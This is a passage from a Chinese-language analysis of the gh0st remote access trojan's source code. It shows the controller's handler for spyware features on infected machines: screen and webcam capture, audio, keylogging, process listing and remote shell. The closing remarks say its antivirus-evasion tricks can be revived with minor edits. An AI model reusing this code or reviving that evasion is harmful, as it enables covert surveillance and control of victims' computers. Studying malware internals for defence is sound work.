			BYTE	*bToken = new BYTE[ m_PassWord.GetLength() + 2 ];//COMMAND_ACTIVED;
			bToken[0] = TOKEN_AUTH;
			memcpy( bToken + 1, m_PassWord, m_PassWord.GetLength() );
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
			delete[] bToken;
//			m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		}
		break;

	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}
 		break;
	case TOKEN_LOGIN_FALSE: // 上线包
		{
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
		}
	case TOKEN_LOGIN_TRUE: // 上线包
		{
			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
			{
				closesocket(pContext->m_Socket);
			}
			else
			{
				pContext->m_bIsMainSocket = true;
				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
			}
		}
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START://键盘记录
		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST://进程列表
		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START://CMD
		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}	
}
```

这里实际上就是把数据交给具体的对话框进行显示了，界面逻辑这里就不介绍了。







### 小结

关于 **gh0st** 源码分析，本文就介绍这么多，但是 **gh0st** 源码中有价值的东西远非这么多。例如，有很多过杀毒软件的措施，虽然可能随着操作系统版本的升级已经失效，但是经过一些简单的修改即可恢复作用。另外，本例中的 **gh0st_client** 以独立的 exe 形式运行，源码中还可以以 Windows 服务等其他形式运行。这是一份非常值得学习和细细体会的珍贵资源，希望能读者带来一些启示和帮助。

最后，郑重声明一下， 本文所分享的技术包括 **gh0st** 源码仅供学习之用，不得非法传播和他用，违者后果自负。





------

**本文首发于『<font color=red>easyserverdev</font>』公众号，欢迎关注，转载请保留版权信息。**

**欢迎加入高性能服务器开发 QQ 群一起交流：<font color=red> 578019391 </font>。**

![微信扫码关注](diagrams\articlelogo.jpg)